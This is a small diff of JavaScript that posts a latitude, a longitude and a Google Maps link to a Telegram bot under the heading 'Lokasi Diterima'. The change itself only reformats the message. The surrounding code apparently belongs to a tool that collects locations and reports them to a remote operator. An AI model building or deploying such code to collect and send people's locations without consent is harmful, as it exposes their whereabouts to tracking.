@@ -111,7 +111,7 @@
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 **Lokasi Diterima**:\n🌍 Latitude: ${lat}\n🌍 Longitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📍Lokasi Diterima📍:\n🌍 Latitude: ${lat}\n🌍 Longitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}` })
                 });
 
                 let formData = new FormData();
